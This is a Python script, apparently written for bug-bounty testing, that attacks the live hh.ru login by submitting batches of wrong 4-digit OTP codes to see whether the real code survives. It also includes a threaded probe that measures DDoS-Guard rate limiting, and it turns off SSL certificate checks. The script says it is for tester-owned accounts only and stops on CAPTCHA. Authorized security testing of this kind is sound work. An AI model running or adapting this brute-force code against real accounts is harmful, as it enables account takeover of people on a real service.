#!/usr/bin/env python3
"""
hh.ru OTP two-generation survival test.

OTP codes are single-use. Submitting the real code early consumes it,
so any later submission fails with CODE_NOT_FOUND regardless of server
defenses. The only valid design uses TWO fresh OTP generations:

  Run 1 — Oracle (email A):
    Generate OTP → submit the real code immediately.
    Accepted = endpoint/state/mechanics are correct.
    CODE_NOT_FOUND = setup is broken → fix before concluding anything.

  Run 2 — Survival (email B):
    Generate OTP → submit 49 wrong codes → submit the real code LAST.
    Interpretation (only valid once Run 1 = Accepted):
      Accepted       → code survived wrong guesses → brute-force viable
      CODE_NOT_FOUND → wrong guesses voided it → silent invalidation
      CODE_EXPIRED   → TTL issue (investigate separately)

  Run 3 — TTL (separate step, fresh OTP):
    Submit the real code at T+0, T+5, T+10, T+15 min.
    Measures actual code lifetime vs state token lifetime.
    49 wrong codes at ~489ms ≈ 25s, too fast for TTL to fire in the
    survival run — this MUST be a separate step.

Usage:
  # Oracle (confirm mechanics):
  python3 otp_test_harness.py oracle --email EMAIL_A --code XXXX

  # Survival (the decisive test):
  python3 otp_test_harness.py survival --email EMAIL_B --code YYYY --wrong-count 49

  # TTL (measure code lifetime, fresh OTP):
  python3 otp_test_harness.py ttl --email EMAIL_A --code XXXX

  # Full sequence (oracle + survival, two emails):
  python3 otp_test_harness.py full \
    --email-a EMAIL_A --code-a XXXX \
    --email-b EMAIL_B --code-b YYYY

Runs ONLY against accounts you control. Stops on CAPTCHA, bot flag,
DDoS-Guard challenge, or unexpected responses.
"""

import argparse
import json
import sys
import time
import random
import concurrent.futures
import urllib.request
import urllib.parse
import urllib.error
import ssl

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

VERIFY_ENDPOINT = "https://hh.ru/account/login/by_code"
GENERATE_ENDPOINT = "https://hh.ru/account/otp_generate"
LOGIN_PAGE = "https://hh.ru/account/login"

HEADERS_BASE = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "X_Bug_Bounty": "thenothing",
    "Content-Type": "application/x-www-form-urlencoded",
}

DDOS_GUARD_SIGNATURES = [
    b"DDoS-Guard",
    b"ddos-guard",
    b"__ddg",
    b"check_js",
    b"Bot Verification",
    b"challenge-platform",
]


def get_session_cookies():
    req = urllib.request.Request(LOGIN_PAGE, headers={
        "User-Agent": HEADERS_BASE["User-Agent"],
        "X_Bug_Bounty": "thenothing",
    })
    try:
        resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=15)
        cookies = {}
        for header in resp.headers.get_all("Set-Cookie") or []:
            parts = header.split(";")[0].split("=", 1)
            if len(parts) == 2:
                cookies[parts[0].strip()] = parts[1].strip()
        return cookies
    except Exception as e:
        print(f"[!] Failed to get session: {e}")
        return {}


def generate_otp(email, cookies, xsrf):
    data = urllib.parse.urlencode({
        "_xsrf": xsrf, "login": email,
    }).encode()
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    headers = {**HEADERS_BASE, "Cookie": cookie_str, "X-Xsrftoken": xsrf}
    req = urllib.request.Request(
        GENERATE_ENDPOINT, data=data, headers=headers, method="POST"
    )
    resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=15)
    return json.loads(resp.read())


def is_ddos_guard_challenge(status, body_bytes):
    if status == 403:
        for sig in DDOS_GUARD_SIGNATURES:
            if sig in body_bytes:
                return True
    if status == 200 and b"<script" in body_bytes:
        for sig in DDOS_GUARD_SIGNATURES:
            if sig in body_bytes:
                return True
    return False


def verify_otp(email, code, state, cookies, xsrf):
    data = urllib.parse.urlencode({
        "_xsrf": xsrf, "login": email,
        "code": code, "state": state,
    }).encode()
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    headers = {**HEADERS_BASE, "Cookie": cookie_str, "X-Xsrftoken": xsrf}
    req = urllib.request.Request(
        VERIFY_ENDPOINT, data=data, headers=headers, method="POST"
    )
    t0 = time.monotonic()
    try:
        resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=15)
        status = resp.status
        raw = resp.read()
        elapsed = int((time.monotonic() - t0) * 1000)
        if is_ddos_guard_challenge(status, raw):
            return status, {"_ddos_guard": True}, elapsed
        try:
            body = json.loads(raw)
        except Exception:
            body = {"_raw": raw.decode("utf-8", errors="replace")[:500]}
        return status, body, elapsed
    except urllib.error.HTTPError as e:
        elapsed = int((time.monotonic() - t0) * 1000)
        raw = e.read()
        if is_ddos_guard_challenge(e.code, raw):
            return e.code, {"_ddos_guard": True}, elapsed
        try:
            body = json.loads(raw)
        except Exception:
            body = {"_raw": raw.decode("utf-8", errors="replace")[:500],
                    "_status": e.code}
        return e.code, body, elapsed


def check_stop(status, body, attempt):
    if body.get("_ddos_guard"):
        return True, f"DDoS-Guard challenge at attempt {attempt} (HTTP {status})"
    if status not in (200, 403):
        return True, f"Unexpected HTTP {status} at attempt {attempt}"
    if status == 403 and not body.get("_ddos_guard"):
        return True, f"HTTP 403 (non-DDoS-Guard) at attempt {attempt}"

    recaptcha = body.get("recaptcha", {})
    hhcaptcha = body.get("hhcaptcha", {})
    vr = body.get("verificationResult", {})

    if recaptcha.get("isBot"):
        return True, f"Bot detection at attempt {attempt}"
    if hhcaptcha.get("captchaKey"):
        return True, f"CAPTCHA required at attempt {attempt} (key={hhcaptcha['captchaKey']})"
    key = vr.get("key", "")
    if key not in ("CODE_NOT_FOUND", "CODE_EXPIRED", "CODE_OK", ""):
        return True, f"Unexpected key '{key}' at attempt {attempt}"
    if vr.get("nextConfirmTime") is not None:
        return True, f"Cooldown at attempt {attempt}: {vr['nextConfirmTime']}"
    return False, ""


def setup_session(cookies_str=None, xsrf_str=None):
    if cookies_str and xsrf_str:
        cookies = dict(pair.split("=", 1) for pair in cookies_str.split("; "))
        return cookies, xsrf_str
    print("[*] Getting fresh session cookies...")
    cookies = get_session_cookies()
    xsrf = cookies.get("_xsrf", "")
    if not xsrf:
        print("[!] No XSRF token. Provide --cookies and --xsrf")
        sys.exit(1)
    print(f"[*] Got {len(cookies)} cookies, xsrf={xsrf[:20]}...")
    return cookies, xsrf


def setup_state(email, state_str, cookies, xsrf):
    if state_str:
        print(f"[*] Using provided state ({len(state_str)} chars)")
        return state_str
    print(f"[*] Generating OTP for {email}...")
    gen = generate_otp(email, cookies, xsrf)
    if gen.get("key") == "CODE_SEND_BLOCKED":
        wait = gen.get("otp", {}).get("secondsUntilNextSend", "?")
        print(f"[!] OTP blocked (cooldown). Wait={wait}s")
        sys.exit(1)
    elif gen.get("success"):
        print(f"[*] OTP sent! codeLength={gen.get('codeLength')}")
    else:
        print(f"[!] OTP generate response: {gen.get('key')}")
    state = gen.get("state", "")
    if not state:
        print("[!] No state token. Cannot continue.")
        sys.exit(1)
    print(f"[*] State: {state[:40]}... ({len(state)} chars)")
    print(f"[*] Code length: {gen.get('codeLength')}")
    print(f"[*] Account type: {gen.get('accountType')}")
    exp = gen.get("expirationTime", {})
    print(f"[*] State expiry: {exp.get('$', 'unknown')}")
    return state


def print_response_detail(body):
    login_val = body.get("login")
    token = body.get("token")
    backurl = body.get("backurl")
    vr = body.get("verificationResult", {})
    print(f"      key={vr.get('key')} login={login_val} "
          f"token={token} backurl={backurl}")
    print(f"      Full: {json.dumps(body, indent=2)[:500]}")


# ─── Run 1: Oracle ───────────────────────────────────────────────────

def run_oracle(email, real_code, state, cookies, xsrf):
    """
    Submit the real code immediately on a fresh OTP generation.
    Confirms endpoint + state + code mechanics are correct.
    """
    print(f"\n{'='*60}")
    print(f"RUN 1: ORACLE")
    print(f"  Email: {email}")
    print(f"  Endpoint: {VERIFY_ENDPOINT}")
    print(f"  Submitting the real code immediately (no wrong guesses)")
    print(f"{'='*60}\n")

    status, body, elapsed = verify_otp(email, real_code, state, cookies, xsrf)
    vr = body.get("verificationResult", {})
    key = vr.get("key", "???")

    print(f"  Status: HTTP {status}")
    print(f"  Key: {key}")
    print(f"  Elapsed: {elapsed}ms")

    should_stop, reason = check_stop(status, body, 1)
    if should_stop and key not in ("CODE_OK",):
        print(f"\n  [!] STOPPED: {reason}")
        return {"accepted": False, "key": key, "reason": reason, "body": body}

    if key in ("CODE_NOT_FOUND", "CODE_EXPIRED"):
        print(f"\n  [!] ORACLE FAILED — key={key}")
        print(f"  The real code was NOT accepted.")
        print(f"  Possible causes:")
        print(f"    - Wrong code (typo?)")
        print(f"    - Wrong endpoint (is this /account/login/by_code?)")
        print(f"    - Wrong state token (state from different generation?)")
        print(f"    - Code already expired")
        print(f"  DO NOT proceed to survival test until this passes.")
        return {"accepted": False, "key": key, "body": body}
    else:
        print(f"\n  [+] ORACLE PASSED — code accepted!")
        print_response_detail(body)
        return {"accepted": True, "key": key, "body": body}


# ─── Run 2: Survival ─────────────────────────────────────────────────

def run_survival(email, real_code, state, cookies, xsrf, wrong_count=49):
    """
    Submit wrong_count wrong codes, then the real code LAST.
    The real code is NEVER submitted before the wrong guesses.

    Interpretation (only valid after Oracle passes on a different email):
      Accepted       → code survived → brute-force viable
      CODE_NOT_FOUND → wrong guesses voided it → silent invalidation
      CODE_EXPIRED   → TTL issue (separate investigation)
    """
    total = wrong_count + 1

    print(f"\n{'='*60}")
    print(f"RUN 2: SURVIVAL")
    print(f"  Email: {email}")
    print(f"  Endpoint: {VERIFY_ENDPOINT}")
    print(f"  {wrong_count} wrong codes, then real code at attempt #{total}")
    print(f"{'='*60}\n")

    wrong_codes = [f"{i:04d}" for i in range(10000) if f"{i:04d}" != real_code]
    random.shuffle(wrong_codes)

    results = {
        "total_attempts": 0,
        "wrong_attempts": 0,
        "final_key": None,
        "final_response": None,
        "stopped_at": None,
        "stop_reason": None,
        "timings_ms": [],
        "defenses_seen": [],
    }

    for attempt in range(1, wrong_count + 1):
        code = wrong_codes[attempt - 1]
        status, body, elapsed = verify_otp(email, code, state, cookies, xsrf)
        results["total_attempts"] = attempt
        results["wrong_attempts"] += 1
        results["timings_ms"].append(elapsed)

        vr = body.get("verificationResult", {})
        key = vr.get("key", "???")
        captcha = body.get("hhcaptcha", {}).get("captchaKey")
        bot = body.get("recaptcha", {}).get("isBot")
        cooldown = vr.get("nextConfirmTime")

        if captcha:
            results["defenses_seen"].append(f"CAPTCHA at #{attempt}")
        if bot:
            results["defenses_seen"].append(f"Bot flag at #{attempt}")
        if cooldown is not None:
            results["defenses_seen"].append(f"Cooldown at #{attempt}")

        if attempt % 10 == 0 or attempt <= 3 or key != "CODE_NOT_FOUND":
            avg_ms = sum(results["timings_ms"]) / len(results["timings_ms"])
            print(f"  [{attempt:4d}/{total}] code={code} key={key} "
                  f"{elapsed}ms avg={avg_ms:.0f}ms")

        should_stop, reason = check_stop(status, body, attempt)
        if should_stop:
            results["stopped_at"] = attempt
            results["stop_reason"] = reason
            print(f"\n  [!] STOPPED: {reason}")
            return results

        time.sleep(0.05)

    # Real code — the survival test
    attempt = wrong_count + 1
    print(f"\n  --- Submitting REAL CODE at attempt #{attempt} ---")

    status, body, elapsed = verify_otp(email, real_code, state, cookies, xsrf)
    results["total_attempts"] = attempt
    results["timings_ms"].append(elapsed)

    vr = body.get("verificationResult", {})
    key = vr.get("key", "???")
    results["final_key"] = key
    results["final_response"] = body

    print(f"  [{attempt:4d}/{total}] code={real_code} key={key} "
          f"{elapsed}ms <<<< REAL CODE")

    if key in ("CODE_NOT_FOUND", "CODE_EXPIRED"):
        print(f"\n  [!] REAL CODE REJECTED — key={key}")
    else:
        print(f"\n  [+] REAL CODE ACCEPTED!")
        print_response_detail(body)

    return results


# ─── Run 3: TTL ───────────────────────────────────────────────────────

def run_ttl(email, real_code, state, cookies, xsrf):
    """
    Measure actual OTP code lifetime by submitting the real code
    at increasing intervals: T+0, T+5min, T+10min, T+15min.

    Requires a fresh OTP generation (code not yet used).
    The survival run is ~25s, far too fast for CODE_EXPIRED to fire —
    TTL MUST be measured separately.
    """
    print(f"\n{'='*60}")
    print(f"RUN 3: TTL MEASUREMENT")
    print(f"  Email: {email}")
    print(f"  Submitting real code at T+0, T+5, T+10, T+15 min")
    print(f"  NOTE: First acceptance consumes the code — test stops there.")
    print(f"{'='*60}\n")

    intervals_sec = [0, 300, 300, 300]
    cumulative = 0

    for i, wait in enumerate(intervals_sec):
        if wait > 0:
            print(f"  Waiting {wait}s ({wait//60}min)...")
            time.sleep(wait)
        cumulative += wait

        status, body, elapsed = verify_otp(
            email, real_code, state, cookies, xsrf)
        vr = body.get("verificationResult", {})
        key = vr.get("key", "???")

        print(f"  T+{cumulative//60:2d}min: key={key} "
              f"status={status} {elapsed}ms")

        should_stop, reason = check_stop(status, body, i + 1)

        if key == "CODE_EXPIRED":
            prev = cumulative - wait
            print(f"\n  [!] Code expired between "
                  f"T+{prev//60}min and T+{cumulative//60}min")
            return {"expired_between": (prev, cumulative)}
        elif key not in ("CODE_NOT_FOUND", "CODE_EXPIRED"):
            print(f"\n  [+] Code accepted at T+{cumulative//60}min!")
            print_response_detail(body)
            print(f"  Code is now consumed. TTL >= {cumulative//60} min.")
            return {"accepted_at": cumulative, "still_valid": True}
        elif should_stop:
            print(f"\n  [!] STOPPED: {reason}")
            return {"stopped": reason}

    print(f"\n  [*] Code still CODE_NOT_FOUND at T+{cumulative//60}min")
    print(f"  Ambiguous — TTL > 15min or code/state is wrong.")
    return {"ambiguous_at": cumulative}


# ─── Concurrency probe ────────────────────────────────────────────────

def run_concurrency(email, state, cookies, xsrf, threads=5, batch=20):
    """Probe DDoS-Guard behavior under concurrent requests."""
    print(f"\n{'='*60}")
    print(f"CONCURRENCY PROBE — {threads} threads, {batch} requests")
    print(f"{'='*60}\n")

    codes = [f"{random.randint(0,9999):04d}" for _ in range(batch)]

    def do_verify(code):
        return code, *verify_otp(email, code, state, cookies, xsrf)

    t0 = time.monotonic()
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(do_verify, c): c for c in codes}
        for future in concurrent.futures.as_completed(futures):
            code, status, body, elapsed = future.result()
            vr = body.get("verificationResult", {})
            results.append({
                "code": code, "status": status,
                "key": vr.get("key", "???"), "elapsed_ms": elapsed,
                "captcha": body.get("hhcaptcha", {}).get("captchaKey"),
                "bot": body.get("recaptcha", {}).get("isBot"),
                "ddos_guard": body.get("_ddos_guard", False),
            })

    wall = int((time.monotonic() - t0) * 1000)
    ddg = [r for r in results if r["ddos_guard"]]
    captcha = [r for r in results if r["captcha"]]
    bot = [r for r in results if r["bot"]]
    non200 = [r for r in results if r["status"] != 200]

    print(f"  Wall time: {wall}ms ({threads} threads)")
    print(f"  DDoS-Guard challenges: {len(ddg)}/{batch}")
    print(f"  CAPTCHAs: {len(captcha)}/{batch}")
    print(f"  Bot flags: {len(bot)}/{batch}")
    print(f"  Non-200: {len(non200)}/{batch}")
    if results:
        avg = sum(r["elapsed_ms"] for r in results) // len(results)
        print(f"  Avg response: {avg}ms")
    return results


# ─── Full sequence ────────────────────────────────────────────────────

def run_full(email_a, code_a, email_b, code_b, cookies, xsrf,
             state_a=None, state_b=None, wrong_count=49):
    """
    Complete two-generation test:
      Run 1: Oracle on email A (fresh code, immediate submission)
      Run 2: Survival on email B (fresh code, wrong codes first,
              real code LAST)
    """
    print(f"[*] FULL SEQUENCE: Oracle + Survival")
    print(f"[*] Oracle email:   {email_a}")
    print(f"[*] Survival email: {email_b}")
    print(f"[*] Endpoint: {VERIFY_ENDPOINT}")

    state_a = setup_state(email_a, state_a, cookies, xsrf)
    print(f"\n[*] Waiting 5s before generating second OTP...")
    time.sleep(5)
    state_b = setup_state(email_b, state_b, cookies, xsrf)

    oracle = run_oracle(email_a, code_a, state_a, cookies, xsrf)

    if not oracle["accepted"]:
        print(f"\n{'='*60}")
        print(f"VERDICT: CANNOT ASSESS")
        print(f"{'='*60}")
        print(f"  Oracle failed (key={oracle['key']}).")
        print(f"  Fix the oracle before running the survival test.")
        print(f"  Check: correct code? correct endpoint? valid state?")
        return

    print(f"\n[*] Oracle passed. Proceeding to survival test...")
    surv = run_survival(email_b, code_b, state_b, cookies, xsrf, wrong_count)

    print(f"\n{'='*60}")
    print(f"FINAL VERDICT")
    print(f"{'='*60}")
    print(f"  Oracle (email A): ACCEPTED")
    print(f"  Survival (email B, after {surv['wrong_attempts']} wrong): "
          f"{surv['final_key']}")

    if surv.get("stop_reason"):
        print(f"  Stopped early: {surv['stop_reason']}")
        print(f"  Survival test incomplete — rerun needed.")
    elif surv["final_key"] is None:
        print(f"  Survival test did not reach the real code submission.")
    elif surv["final_key"] in ("CODE_NOT_FOUND",):
        print(f"\n  >>> SILENT INVALIDATION CONFIRMED <<<")
        print(f"  Wrong guesses voided the code.")
        print(f"  Brute-force is FUTILE. Severity: Informative.")
    elif surv["final_key"] in ("CODE_EXPIRED",):
        print(f"\n  >>> CODE EXPIRED <<<")
        print(f"  The code timed out during the wrong-guess phase.")
        print(f"  This is a TTL issue, not invalidation.")
        print(f"  Run the TTL test to measure actual lifetime.")
    else:
        print(f"\n  >>> CODE SURVIVED {surv['wrong_attempts']} "
              f"WRONG GUESSES <<<")
        print(f"  Brute-force is VIABLE.")
        print(f"  Next: measure DDoS-Guard threshold + code TTL")
        print(f"  to determine final severity (P1/P2/P3).")

    if surv["defenses_seen"]:
        print(f"\n  Defenses observed during wrong-code phase:")
        for d in surv["defenses_seen"]:
            print(f"    - {d}")

    if surv["timings_ms"]:
        avg = sum(surv["timings_ms"]) / len(surv["timings_ms"])
        print(f"\n  Avg response: {avg:.0f}ms over {len(surv['timings_ms'])} "
              f"requests")


# ─── CLI ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="hh.ru OTP two-generation survival test")
    sub = parser.add_subparsers(dest="command", required=True)

    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--cookies", help="Cookie string")
    common.add_argument("--xsrf", help="XSRF token")

    p_oracle = sub.add_parser("oracle", parents=[common],
                              help="Run 1: confirm code/endpoint mechanics")
    p_oracle.add_argument("--email", required=True)
    p_oracle.add_argument("--code", required=True, help="Real 4-digit OTP")
    p_oracle.add_argument("--state", help="OTP state token")

    p_surv = sub.add_parser("survival", parents=[common],
                            help="Run 2: wrong codes then real code last")
    p_surv.add_argument("--email", required=True)
    p_surv.add_argument("--code", required=True, help="Real 4-digit OTP")
    p_surv.add_argument("--state", help="OTP state token")
    p_surv.add_argument("--wrong-count", type=int, default=49,
                        help="Wrong codes before real (default: 49)")

    p_ttl = sub.add_parser("ttl", parents=[common],
                           help="Run 3: measure code lifetime")
    p_ttl.add_argument("--email", required=True)
    p_ttl.add_argument("--code", required=True, help="Real 4-digit OTP")
    p_ttl.add_argument("--state", help="OTP state token")

    p_conc = sub.add_parser("concurrency", parents=[common],
                            help="Probe DDoS-Guard under concurrent load")
    p_conc.add_argument("--email", required=True)
    p_conc.add_argument("--state", help="OTP state token")
    p_conc.add_argument("--threads", type=int, default=5)
    p_conc.add_argument("--batch", type=int, default=20)

    p_full = sub.add_parser("full", parents=[common],
                            help="Oracle + Survival in sequence")
    p_full.add_argument("--email-a", required=True,
                        help="Email for oracle (code submitted immediately)")
    p_full.add_argument("--code-a", required=True,
                        help="Real OTP code for email A")
    p_full.add_argument("--email-b", required=True,
                        help="Email for survival (code submitted last)")
    p_full.add_argument("--code-b", required=True,
                        help="Real OTP code for email B")
    p_full.add_argument("--state-a", help="State token for email A")
    p_full.add_argument("--state-b", help="State token for email B")
    p_full.add_argument("--wrong-count", type=int, default=49)

    args = parser.parse_args()

    codes_to_check = []
    if hasattr(args, "code"):
        codes_to_check.append(("--code", args.code))
    if hasattr(args, "code_a"):
        codes_to_check.append(("--code-a", args.code_a))
    if hasattr(args, "code_b"):
        codes_to_check.append(("--code-b", args.code_b))

    for flag, val in codes_to_check:
        if len(val) != 4 or not val.isdigit():
            print(f"[!] {flag} must be exactly 4 digits (got: {val})")
            sys.exit(1)

    print(f"[*] hh.ru OTP Test — {args.command}")
    print(f"[*] Endpoint: {VERIFY_ENDPOINT}")

    cookies, xsrf = setup_session(
        getattr(args, "cookies", None),
        getattr(args, "xsrf", None))

    if args.command == "oracle":
        state = setup_state(args.email, getattr(args, "state", None),
                            cookies, xsrf)
        run_oracle(args.email, args.code, state, cookies, xsrf)

    elif args.command == "survival":
        state = setup_state(args.email, getattr(args, "state", None),
                            cookies, xsrf)
        surv = run_survival(args.email, args.code, state, cookies, xsrf,
                            args.wrong_count)
        print(f"\n{'='*60}")
        print(f"STANDALONE SURVIVAL VERDICT")
        print(f"{'='*60}")
        if surv.get("stop_reason"):
            print(f"  Stopped: {surv['stop_reason']}")
        elif surv["final_key"] is None:
            print(f"  Did not reach real code.")
        elif surv["final_key"] in ("CODE_NOT_FOUND",):
            print(f"  CODE_NOT_FOUND after {surv['wrong_attempts']} "
                  f"wrong → silent invalidation (or code consumed "
                  f"elsewhere)")
        elif surv["final_key"] in ("CODE_EXPIRED",):
            print(f"  CODE_EXPIRED → TTL issue")
        else:
            print(f"  ACCEPTED after {surv['wrong_attempts']} wrong "
                  f"→ code survived!")

    elif args.command == "ttl":
        state = setup_state(args.email, getattr(args, "state", None),
                            cookies, xsrf)
        run_ttl(args.email, args.code, state, cookies, xsrf)

    elif args.command == "concurrency":
        state = setup_state(args.email, getattr(args, "state", None),
                            cookies, xsrf)
        run_concurrency(args.email, state, cookies, xsrf,
                        args.threads, args.batch)

    elif args.command == "full":
        run_full(args.email_a, args.code_a, args.email_b, args.code_b,
                 cookies, xsrf,
                 getattr(args, "state_a", None),
                 getattr(args, "state_b", None),
                 args.wrong_count)

    print(f"\n[*] Done.")


if __name__ == "__main__":
    main()
